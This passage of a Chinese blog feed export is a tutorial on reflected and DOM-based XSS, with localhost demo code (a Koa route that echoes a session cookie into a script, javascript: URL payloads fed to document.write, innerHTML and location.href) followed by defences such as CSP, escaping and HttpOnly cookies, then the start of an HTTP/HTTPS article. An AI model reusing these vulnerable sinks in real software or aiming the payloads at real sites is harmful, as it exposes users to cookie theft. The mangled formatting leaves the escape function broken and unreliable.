class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】常见的反射型 XSS 是：恶意链接。比如我现在做一个 demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html 代码如下：</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;csrf攻击&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;a href=&quot;http://localhost:3001/xss&quot;&gt;xxs 攻击&lt;/a&gt;</span><br><span class="line">    &lt;a href=&quot;http://localhost:3001/testcookie&quot;&gt;testcookie 攻击&lt;/a&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><br /><br />【示例】常见的反射型 XSS 是：恶意链接。比如我现在做一个 demo。在本地启动一个简单的服务器，然后在页面上点击一个链接后，比如如下代码：html 代码如下：<br />然后 node 中 app.js 代码如下：&#96;&#96;&#96;javascript</p><p>const Koa &#x3D; require(‘koa’);<br>const fs &#x3D; require(‘fs’);<br>const path &#x3D; require(‘path’);<br>const router &#x3D; require(‘koa-router’)();<br>const koaBody &#x3D; require(‘koa-body’);<br>const static &#x3D; require(‘koa-static’);</p><p>const app &#x3D; new Koa();</p><p>router.get(‘&#x2F;‘, (ctx, next) &#x3D;&gt; {<br>&#x2F;&#x2F; 设置头类型, 如果不设置，会直接下载该页面<br>ctx.type &#x3D; ‘html’;<br>&#x2F;&#x2F; 读取文件<br>const pathUrl &#x3D; path.join(__dirname, ‘&#x2F;static&#x2F;index.html’);<br>ctx.body &#x3D; fs.createReadStream(pathUrl);<br>next();<br>});</p><p>router.get(‘&#x2F;xss’, (ctx, next) &#x3D;&gt; {<br>ctx.body &#x3D; ‘<script>alert("反射型 XSS 攻击")</script>‘;<br>});<br>router.get(‘&#x2F;testcookie’, (ctx, next) &#x3D;&gt; {<br>console.log(ctx.cookies.get(‘connect.sid’));<br>ctx.body &#x3D; ‘<script>alert("'+ctx.cookies.get('connect.sid')+'")</script>‘;<br>next();<br>});</p><p>app.use(static(path.join(__dirname)));</p><p>app.use(router.routes());<br>app.use(router.allowedMethods());</p><p>app.listen(3001, () &#x3D;&gt; {<br>console.log(‘server is listen in 3001’);<br>});</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">如上代码，当用户点击xxs 攻击恶意链接时候，页面会跳转到 http://localhost:3001/xss 攻击者预先准备的页面，然后会返回攻击者准备的js脚本，该js脚本就在浏览器中执行了，如下所示：&lt;br /&gt;&lt;br /&gt;![](https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&amp;url=cdn.nlark.com/yuque/0/2022/png/355497/1647220225733-e142aa42-1f9f-4405-8d7d-7d45180f4841.png)</span><br><span class="line"></span><br><span class="line">然后我们点击 testcookie 该链接，也会调用node中的 router.get(&#x27;/testcookie&#x27;, (ctx, next) =&gt; &#123;&#125;) 这个请求获取到cookie，如下所示：</span><br><span class="line"></span><br><span class="line">![](https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&amp;url=cdn.nlark.com/yuque/0/2022/png/355497/1647220238518-b756be01-097c-4567-8a42-154d52be52c8.png)</span><br><span class="line"></span><br><span class="line">如上我们就可以很容易通过xss攻击拿到对方的cookie信息了。 |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">**反射型XSS特征**&lt;br /&gt;一、非持久型 XSS 漏洞攻击有以下几点**特征**：&lt;br /&gt;●即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。&lt;br /&gt;●攻击者需要诱骗点击,必须要通过用户点击链接才能发起&lt;br /&gt;●反馈率低，所以较难发现和响应修复&lt;br /&gt;●盗取用户敏感保密信息</span><br><span class="line"></span><br><span class="line">**反射型XSS攻击步骤**&lt;br /&gt;一、反射型XSS攻击步骤：&lt;br /&gt;1. 攻击者在url后面的参数中加入恶意攻击代码。 2. 当用户打开带有恶意代码的URL的时候，网站服务端将恶意代码从URL中取出，拼接在html中并且返回给浏览器端。 3. 用户浏览器接收到响应后执行解析，其中的恶意代码也会被执行到。 4. 攻击者通过恶意代码来窃取到用户数据并发送到攻击者的网站。攻击者会获取到比如cookie等信息，然后使用该信息来冒充合法用户的行为，调用目标网站接口执行攻击等操作。</span><br><span class="line"></span><br><span class="line">**反射型XSS的防范：**&lt;br /&gt;一、为了防止出现非持久型 XSS 漏洞，需要确保这么几件事情：&lt;br /&gt;●Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。&lt;br /&gt;●尽量不要从URL，document.referrer，document.forms等这种 DOM API 中获取数据直接渲染。&lt;br /&gt;●尽量不要使用eval,new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.createElement()等可执行字符串的方法。&lt;br /&gt;●如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义(小程序跳转)。&lt;br /&gt;●前端渲染的时候对任何的字段都需要做 escape 转义编码。</span><br><span class="line"></span><br><span class="line">&lt;a name=&quot;CKLh7&quot;&gt;&lt;/a&gt;</span><br><span class="line">### DOM-based型攻击</span><br><span class="line">一、利用dom本身的缺陷，进行攻击&lt;br /&gt;我们客户端的js可以对页面dom节点进行动态的操作，比如插入、修改页面的内容。&lt;br /&gt;比如说客户端从URL中提取数据并且在本地执行、如果用户在客户端输入的数据包含了恶意的js脚本的话，但是这些脚本又没有做任何过滤处理的话，那么我们的应用程序就有可能受到DOM-based XSS的攻击。</span><br><span class="line"></span><br><span class="line">二、DOM XSS 是**基于文档对象模型的XSS**。&lt;br /&gt;一般有如下DOM操作：&lt;br /&gt; 1. 使用document.write直接输出数据。 &lt;br /&gt; 2. 使用innerHTML直接输出数据。 &lt;br /&gt; 3. 使用location、location.href、location.replace、iframe.src、document.referer、window.name等这些。</span><br><span class="line"></span><br><span class="line">| 【示例】</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  document.body.innerHTML = &quot;&lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th>假如对于变量 url 的值是：javascript:alert(‘dom-xss’); 类似这样的，那么就会收到 xss 的攻击了</th></tr></thead></table><p>因此对于 DOM XSS 主要是由于本地客户端获取的 DOM 数据在本地执行导致的。因此我们需要对 HTML 进行编码，对 JS 进行编码来防止这些问题产生。</p><p>| 【示例】 使用 document.write 直接输出导致浏览器解析恶意代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）</span><br><span class="line">    // 为了方便演示，我们假如url是 如下这样的</span><br><span class="line">    // http://127.0.0.1/xsstest.html?url=javascript:alert(&#x27;xsstest&#x27;);</span><br><span class="line">    // 然后我们的是 s 的值就为如下：</span><br><span class="line">    s = &quot;?url=javascript:alert(&#x27;xsstest&#x27;)&quot;;</span><br><span class="line">    s = s.substring(1, s.length);       // 返回整个查询内容</span><br><span class="line">    var url = &quot;&quot;;                       // 定义变量url</span><br><span class="line">    if (s.indexOf(&quot;url=&quot;) &gt; -1) &#123;       // 判断URL是否为空</span><br><span class="line">      var pos = s.indexOf(&quot;url=&quot;) + 4;  // 过滤掉&quot;url=&quot;字符</span><br><span class="line">      url = s.substring(pos, s.length);  // 得到地址栏里的url参数</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      url = &quot;url参数为空&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    document.write(&#x27;url: &lt;a href=&quot;&#x27; + url + &#x27;&quot;&gt;&quot;&#x27; + url + &#x27;&quot;&lt;/a&gt;&#x27;);</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>页面渲染完成后，点击弹窗如下所示：</p><p>| <img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1647220516109-20138276-c8b6-46a6-91c0-8b774056c561.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/355497/1647220516109-20138276-c8b6-46a6-91c0-8b774056c561.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br>| —————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————- |</p><p>| 【示例】使用 innerHTML 直接输出导致浏览器解析恶意代码&#96;&#96;&#96;javascript</p><!DOCTYPE html><html><head>  <meta charset=utf-8>  <meta name="referrer" content="never">  <title></title></head><body>  <script type="text/javascript">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）    // 为了方便演示，我们假如url是 如下这样的    // http://127.0.0.1/xsstest.html?url=javascript:alert('xsstest');     // 然后我们的是 s 的值就为如下：    s = "?url=javascript:alert('xsstest')";    s = s.substring(1, s.length);       // 返回整个查询内容    var url = "";                       // 定义变量url    if (s.indexOf("url=") > -1) {       // 判断URL是否为空       var pos = s.indexOf("url=") + 4;  // 过滤掉"url="字符      url = s.substring(pos, s.length);  // 得到地址栏里的url参数    } else {      url = "url参数为空";    }  </script>  <div id='test'><a href=""></a></div>  <script type="text/javascript">      document.getElementById("test").innerHTML = '我的url是: <a href="' + url + '">"' + url + '"</a>';  </script></body></html><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">点击一样也会弹窗窗口的。也会一样执行xss攻击的。 |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】使用 location/location.href/location.replace/iframe.src 造成的 XSS```javascript</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=utf-8&gt;</span><br><span class="line">  &lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;</span><br><span class="line">  &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    var s = location.search;            // 返回URL中的查询部分（？之后的内容）</span><br><span class="line">    // 为了方便演示，我们假如url是 如下这样的</span><br><span class="line">    // http://127.0.0.1/xsstest.html?url=javascript:alert(&#x27;xsstest&#x27;); </span><br><span class="line">    // 然后我们的是 s 的值就为如下：</span><br><span class="line">    s = &quot;?url=javascript:alert(&#x27;xsstest&#x27;)&quot;;</span><br><span class="line">    s = s.substring(1, s.length);       // 返回整个查询内容</span><br><span class="line">    var url = &quot;&quot;;                       // 定义变量url</span><br><span class="line">    if (s.indexOf(&quot;url=&quot;) &gt; -1) &#123;       // 判断URL是否为空 </span><br><span class="line">      var pos = s.indexOf(&quot;url=&quot;) + 4;  // 过滤掉&quot;url=&quot;字符</span><br><span class="line">      url = s.substring(pos, s.length);  // 得到地址栏里的url参数</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      url = &quot;url参数为空&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">  &lt;div id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/div&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    location.href = url;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>刷新下页面，也会弹出窗口执行 xss攻击了。 || --- |<p><strong>DOM 型 XSS 的攻击步骤</strong><br />一、DOM 型 XSS 的攻击步骤如下：<br /> 1. 攻击者构造出特殊的 URL、在其中可能包含恶意代码。 <br /> 2. 用户打开带有恶意代码的 URL。<br /> 3. 用户浏览器收到响应后解析执行。前端使用 js 取出 url 中的恶意代码并执行。<br /> 4. 执行时，恶意代码窃取用户数据并发送到攻击者的网站中，那么攻击者网站拿到这些数据去冒充用户的行为操作。调用目标网站接口执行攻击者一些操作。</p><p><a name="yV42u"></a></p><h1 id="XSS-防御手段"><a href="#XSS-防御手段" class="headerlink" title="XSS 防御手段"></a>XSS 防御手段<br /><br /></h1><p><a name="zodXo"></a></p><h2 id="过滤-x2F-CSP-Content-Security-Policy"><a href="#过滤-x2F-CSP-Content-Security-Policy" class="headerlink" title="过滤 &#x2F; CSP(Content-Security-Policy)"></a>过滤 &#x2F; CSP(Content-Security-Policy)</h2><p>一、移除用户输入的和事件相关的属性</p><p>| 【示例】onerror 可以自动触发攻击，还有 onclick 等。<br />移除用户输入的 Style 节点、Script 节点、Iframe 等节点。</p><p>| |<br>| |</p><p>二、CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。<br />三、通常可以通过两种方式来开启 CSP：<br />● 设置 HTTP Header 中的 Content-Security-Policy<br />● 设置 meta 标签的方式</p><p>| 【示例】这里以设置 HTTP Header 来举例：<br />● 只允许加载本站资源<br />Content-Security-Policy: default-src ‘self’ <br />● 只允许加载 HTTPS 协议图片<br />Content-Security-Policy: img-src https:&#x2F;&#x2F;* <br />● 允许加载任何来源框架<br />Content-Security-Policy: child-src ‘none’ <br />如需了解更多属性，请查看<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content-Security-Policy 文档</a></p><p>| |<br>| |</p><p>四、对于这种方式来说，只要开发者配置了正确的规则，那么即使网站存在漏洞，攻击者也不能执行它的攻击代码，并且 CSP 的兼容性也不错。</p><p><a name="OXM1w"></a></p><h2 id="编码-x2F-转义字符"><a href="#编码-x2F-转义字符" class="headerlink" title="编码 &#x2F; 转义字符"></a>编码 &#x2F; 转义字符</h2><p>一、HTML Entity 编码，对用户输入的数据进行编码</p><p>| 【示例】用户的输入永远不可信任的，最普遍的做法就是转义输入输出的内容，对于引号、尖括号、斜杠进行转义&#96;&#96;&#96;javascript<br>function escape(str) {<br>  str &#x3D; str.replace(&#x2F;&amp;&#x2F;g, ‘&amp;’)<br>  str &#x3D; str.replace(&#x2F;&lt;&#x2F;g, ‘&lt;’)<br>  str &#x3D; str.replace(&#x2F;&gt;&#x2F;g, ‘&gt;’)<br>  str &#x3D; str.replace(&#x2F;“&#x2F;g, ‘&amp;quto;’)<br>  str &#x3D; str.replace(&#x2F;‘&#x2F;g, ‘&#39;’)<br>  str &#x3D; str.replace(&#x2F;&#96;&#x2F;g, ‘&#96;’)<br>str &#x3D; str.replace(&#x2F;/&#x2F;g, ‘&#x2F;’)<br>return str<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> |</span><br><span class="line">| --- |</span><br><span class="line"></span><br><span class="line">| 【示例】但是对于显示富文本来说，显然不能通过上面的办法来转义所有字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过滤的标签和标签属性实在太多，更加推荐使用白名单的方式。以下示例使用了 js-xss 来实现，可以看到在输出中保留了 h1 标签且过滤了 script 标签。```javascript</span><br><span class="line">const xss = require(&#x27;xss&#x27;)</span><br><span class="line">let html = xss(&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS Demo&lt;/h1&gt;&lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt;&#x27;)</span><br><span class="line">// -&gt; &lt;h1&gt;XSS Demo&lt;/h1&gt;&amp;lt;script&amp;gt;alert(&quot;xss&quot;);&amp;lt;/script&amp;gt;</span><br><span class="line">console.log(html)</span><br></pre></td></tr></table></figure><p>| |<br>| |</p><p><a name="zlQXa"></a></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>将重要的 cookie 设置成 http only，这样就不能通过 js 获取到该 cookie 了<br />1、这是预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663576935423-215d9f04-af0d-4b5c-89c1-f24698066784.png#clientId=udbc3878e-8c94-4&from=paste&height=358&id=ub00552af&originHeight=358&originWidth=1751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69081&status=done&style=none&taskId=uaeea5fa4-5444-4d91-8cc7-a84d14cdafb&title=&width=1751" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/300943/1663576935423-215d9f04-af0d-4b5c-89c1-f24698066784.png#clientId=udbc3878e-8c94-4&from=paste&height=358&id=ub00552af&originHeight=358&originWidth=1751&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69081&status=done&style=none&taskId=uaeea5fa4-5444-4d91-8cc7-a84d14cdafb&title=&width=1751" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="image.png"></p><p><a name="JydVM"></a></p><h2 id="校正"><a href="#校正" class="headerlink" title="校正"></a>校正</h2><p>一、避免直接对 HTML Entity 进行解码，使用 DOM Parse 转换，校对不配对的 DOM 标签。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http与https</title>
      <link href="/2023/06/29/frontend/security/http-yu-https/"/>
      <url>/2023/06/29/frontend/security/http-yu-https/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="2a592495"></a></p><h2 id="HTTP-与-HTTPS"><a href="#HTTP-与-HTTPS" class="headerlink" title="HTTP 与 HTTPS"></a>HTTP 与 HTTPS</h2><p><a name="HTTP"></a></p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP，全称 HyperText Transfer Protocol，中文名称超文本传输协议，传统的 web 站点都是建立在 HTTP 协议基础上进行通信的，我们访问某些站点时，首先通过该协议传输生成网页的基础文件如.html、.css、.js 等等，除此以外，还可以传输图片等其他格式文件。而这一切又需要建立在网络的基础上。通常使用的网络（包括互联网）是在 TCP&#x2F;IP 协议族的基础上运作的，而 HTTP 属于 TCP&#x2F;IP 协议族内部的一个子集。</p><p><a name="09cc1306"></a></p><h3 id="TCP-x2F-IP"><a href="#TCP-x2F-IP" class="headerlink" title="TCP&#x2F;IP"></a>TCP&#x2F;IP</h3><p>简单回顾一下计算机基础知识，何为 TCP&#x2F;IP 协议族。计算机与网络设备进行相互通信，首先双方要基于同一种方法。比如，如何探测到通信目标、由哪一边先发起通信、使用哪种语言进行通信、怎样结束通信等规则都需要事先确定。不同的硬件、操作系统之间的通信，所有的这一切都需要一种规则。而我们就把这种规则称为协议（protocol）。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913619382-d9f3edf6-be59-4df3-9aa1-e1f303fb8f8e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913619382-d9f3edf6-be59-4df3-9aa1-e1f303fb8f8e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="TCP、IP是互联网相关的各类协议族的总称.png"></p><p><a name="57d03375"></a></p><h4 id="图-1-TCP-x2F-IP-是互联网相关的各类协议族的总称"><a href="#图-1-TCP-x2F-IP-是互联网相关的各类协议族的总称" class="headerlink" title="图 1.TCP&#x2F;IP 是互联网相关的各类协议族的总称"></a>图 1.TCP&#x2F;IP 是互联网相关的各类协议族的总称</h4><p>协议中存在各式各样的内容。从电缆的规格到 IP 地址的选定方法、寻找异地用户的方法、双方建立通信的顺序，以及 Web 页面显示需要处理的步骤，等等。像这样把与互联网相关联的协议集合起来总称为 TCP&#x2F;IP。</p><p>TCP&#x2F;IP 协议族里重要的一点就是分层，从上到下分为应用层、传输层、网络层、链路层。各层的作用如下：</p><ul><li><strong>应用层</strong>   应用层决定了向用户提供应用服务时通信的活动。TCP&#x2F;IP 协议族内预存了各类通用的应用服务。比如，FTP（File Transfer Protocol，文件传输协议）和 DNS（Domain Name System，域名系统）服务就是其中两类。最常见的 HTTP 协议也处于该层。</li><li><strong>传输层</strong>   传输层对上层应用层，提供处于网络连接中的两台计算机之间的数据传输。在传输层有两个性质不同的协议：TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Data Protocol，用户数据报协议）。</li><li><strong>网络层</strong>   网络层用来处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径（所谓的传输路线）到达对方计算机，并把数据包传送给对方。与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。</li><li><strong>链路层</strong>   用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC（NetworkInterface Card，网络适配器，即网卡），及光纤等物理可见部分（还包括连接器等一切传输媒介）。硬件上的范畴均在链路层的作用范围之内。</li></ul><p><strong>TCP&#x2F;IP 通讯传输流动：</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913637128-63907609-4648-4880-95c7-42d7bdea44e8.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913637128-63907609-4648-4880-95c7-42d7bdea44e8.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="TCP、IP通讯传输流动.png"></p><p><a name="756f6553"></a></p><h4 id="图-2-TCP-x2F-IP-通讯传输流动"><a href="#图-2-TCP-x2F-IP-通讯传输流动" class="headerlink" title="图 2.TCP&#x2F;IP 通讯传输流动"></a>图 2.TCP&#x2F;IP 通讯传输流动</h4><p>无论时从服务器发起通讯还是从客户端发起通讯都必须遵循以上的数据流动原则：假如从客户端发起通讯，数据则从应用层-&gt;传输层-&gt;网络层-&gt;链路层-&gt;链路层-&gt;网络层-&gt;传输层-&gt;应用层这样传输，并且每向下经过一层便会封装包裹该层的首部信息，每向上一层消去该层的首部信息，层层校验防止出错。</p><p><a name="80d34954"></a></p><h3 id="HTTP-存在的问题"><a href="#HTTP-存在的问题" class="headerlink" title="HTTP 存在的问题"></a>HTTP 存在的问题</h3><p>HTTP 本身是比较简单方便的协议，而简单协议带来的缺点就是安全问题，主要是以下三点：</p><ul><li>通信使用明文（不加密），内容可能会被窃听。由于 HTTP 本身不具备加密的功能，所以也无法做到对通信整体进行加密。即，HTTP 报文使用明文方式发送。</li><li>不验证通信方的身份，因此有可能遭遇伪装。HTTP 协议中的请求和响应不会对通信方进行确认。也就是说存在“服务器是否就是发送请求中 URI 真正指定的主机，返回的响应是否真的返回到实际提出请求的客户端”等类似问题。</li><li>无法证明报文的完整性，所以有可能已遭篡改。在报文的传输过程中，必须经过物理介质传输（量子通信除外），就无法避免被外界篡改的可能。由于 HTTP 协议无法证明通信的报文完整性，因此，在请求或响应送出之后直到对方接收之前的这段时间内，即使请求或响应的内容遭到篡改，也没有办法获悉。虽然有部分办法能够确定报文完整性的方，但事实上不完全可靠，其中常用的是 MD5 和 SHA-1 等散列值校验的方法，以及用来确认文件的数字签名方法，但是有谁又能保证 MD5、SHA-1 计算得到的散列值不被中途篡改呢。</li></ul><p><a name="a56c601e"></a></p><h3 id="HTTP-加密-认证-完整性保护-x3D-HTTPS"><a href="#HTTP-加密-认证-完整性保护-x3D-HTTPS" class="headerlink" title="HTTP+加密+认证+完整性保护&#x3D;HTTPS"></a>HTTP+加密+认证+完整性保护&#x3D;HTTPS</h3><p>为了统一解决上述这些问题，需要在 HTTP 上再加入加密处理和认证等机制。人们把添加了加密及认证机制的 HTTP 称为 HTTPS（HTTP Secure）。HTTPS 并非是新的协议，而是身披 SSL 外壳的 HTTP，只是把 HTTP 通信接口部分用 SSL（Secure Socket Layer）和 TLS（Transport Layer Security，TSL 是以 SSL 为原型开发的协议，有时会统一称该协议为 SSL。）协议代替而已。所以从层级间通信来说，就由 HTTP 直接和 TCP 通信演变为 HTTP 直接与 SSL 通信，再由 SSL 与 TCP 通信而已。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913653007-d5eaca4c-a35e-4c7c-bf3a-7648829e7326.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1787397/1594913653007-d5eaca4c-a35e-4c7c-bf3a-7648829e7326.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif" alt="HTTP与HTTPS.png"></p><p><a name="9379c769"></a></p><h4 id="图-3-HTTP-与-HTTPS"><a href="#图-3-HTTP-与-HTTPS" class="headerlink" title="图 